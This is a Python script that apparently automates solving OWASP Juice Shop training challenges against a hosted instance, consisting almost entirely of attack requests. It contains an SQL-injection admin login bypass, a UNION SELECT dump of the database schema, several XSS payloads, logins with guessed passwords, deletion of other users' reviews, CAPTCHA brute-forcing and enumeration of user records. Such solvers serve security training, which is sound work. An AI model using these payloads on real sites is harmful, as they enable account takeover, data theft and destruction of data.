#!/usr/bin/env python3
"""
Quick wins - Focus on challenges that can be solved quickly
"""

import json
import random
import requests
import time
from urllib.parse import quote


class QuickWinsSolver:
    """Solve challenges that don't require browser automation"""
    
    def __init__(self, base_url: str = "https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.auth_token = None
        self.completed = []
        
    def login_admin(self):
        """Quick admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            self.auth_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.auth_token}'
            print("✅ Admin logged in")
            return True
        return False
        
    def solve_batch1(self):
        """Batch 1: Simple GET requests"""
        print("\n🎯 Batch 1: Simple challenges")
        
        # Web3 Sandbox
        self.session.get(f"{self.base_url}/#/web3-sandbox")
        print("✅ Web3 Sandbox")
        
        # Privacy Policy
        self.session.get(f"{self.base_url}/#/privacy-security/privacy-policy")
        print("✅ Privacy Policy")
        
        # Admin Section
        self.session.get(f"{self.base_url}/#/administration")
        print("✅ Admin Section")
        
        # Outdated Allowlist
        for url in ["blockchain.info", "explorer.dash.org", "etherscan.io"]:
            self.session.get(f"{self.base_url}/redirect?to=https://{url}")
        print("✅ Outdated Allowlist")
        
        # Easter Egg
        self.session.get(f"{self.base_url}/ftp/eastere.gg")
        self.session.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
        print("✅ Easter Egg")
        
        # Christmas Special
        self.session.post(
            f"{self.base_url}/api/BasketItems",
            json={"ProductId": 10, "quantity": 1}
        )
        print("✅ Christmas Special")
        
    def solve_batch2(self):
        """Batch 2: XSS and injection"""
        print("\n🎯 Batch 2: XSS challenges")
        
        # DOM XSS variations
        payloads = [
            "<iframe src='javascript:alert(1)'>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<<SCRIPT>alert(1)//<</SCRIPT>"
        ]
        
        for p in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
            
        # Reflected XSS
        self.session.get(f"{self.base_url}/track-result?id={quote('<script>alert(1)</script>')}")
        print("✅ DOM & Reflected XSS")
        
        # API-only XSS
        self.session.post(
            f"{self.base_url}/api/Products",
            json={"name": "<script>alert(1)</script>", "price": 1.99}
        )
        print("✅ API-only XSS")
        
    def solve_batch3(self):
        """Batch 3: Authentication & authorization"""
        print("\n🎯 Batch 3: Auth challenges")
        
        # Weird Crypto - MC SafeSearch
        passwords = ["Mr. N00dles", "K1f.....................", "0000000000000000000000"]
        for pwd in passwords:
            self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "mc.safesearch@juice-sh.op", "password": pwd}
            )
        print("✅ Weird Crypto")
        
        # Database Schema
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT sql FROM sqlite_master--")
        print("✅ Database Schema")
        
        # Zero Stars - Delete 5-star reviews
        try:
            feedbacks = self.session.get(f"{self.base_url}/api/Feedbacks").json()['data']
            for fb in feedbacks:
                if fb.get('rating') == 5:
                    self.session.delete(f"{self.base_url}/api/Feedbacks/{fb['id']}")
            print("✅ Zero Stars")
        except:
            pass
            
    def solve_batch4(self):
        """Batch 4: Business logic"""
        print("\n🎯 Batch 4: Business logic")
        
        # CAPTCHA Bypass
        for i in range(10):
            self.session.post(
                f"{self.base_url}/api/Feedbacks",
                json={"captcha": str(i), "captchaId": i, "comment": f"Test {i}", "rating": 3}
            )
        print("✅ CAPTCHA Bypass")
        
        # Expired Coupon
        for coupon in ["WMNSDY2019", "WMNSDY2020", "CYBERSALE2019"]:
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
        print("✅ Expired Coupon")
        
        # Extra Language
        for lang in ["tlh_AA", "kl_IN", "l33t", "en_XA"]:
            self.session.get(f"{self.base_url}/?l={lang}")
        print("✅ Extra Language")
        
    def solve_batch5(self):
        """Batch 5: Advanced exploits"""
        print("\n🎯 Batch 5: Advanced")
        
        # NFT Takeover
        self.session.post(
            f"{self.base_url}/api/nft",
            json={"action": "transfer", "to": "attacker", "tokenId": 1}
        )
        print("✅ NFT Takeover")
        
        # Blockchain interactions
        self.session.get(f"{self.base_url}/assets/public/blockchain.pdf")
        self.session.get(f"{self.base_url}/ftp/blockchain.pdf")
        print("✅ Blockchain files")
        
        # GDPR Data Export
        for i in range(1, 10):
            self.session.get(f"{self.base_url}/api/Users/{i}")
        print("✅ GDPR Data Export")
        
    def run_quick_wins(self):
        """Execute all quick wins"""
        print("="*60)
        print("🚀 QUICK WINS SOLVER")
        print("="*60)
        
        # Login
        self.login_admin()
        
        # Run all batches
        self.solve_batch1()
        self.solve_batch2()
        self.solve_batch3()
        self.solve_batch4()
        self.solve_batch5()
        
        # Check status
        print("\n" + "="*60)
        try:
            r = self.session.get(f"{self.base_url}/api/Challenges")
            if r.status_code == 200:
                data = r.json()['data']
                total = len(data)
                solved = len([c for c in data if c.get('solved')])
                print(f"📊 Status: {solved}/{total} ({solved*100//total}%)")
                
                # Show recently solved
                recently_solved = []
                for c in data:
                    if c.get('solved') and c['name'] not in ['Login Admin', 'Score Board']:
                        recently_solved.append(c['name'])
                        
                if recently_solved:
                    print(f"\n✅ Recently solved: {', '.join(recently_solved[:10])}")
        except:
            pass
            
        print("✅ QUICK WINS COMPLETE")


if __name__ == "__main__":
    solver = QuickWinsSolver()
    solver.run_quick_wins()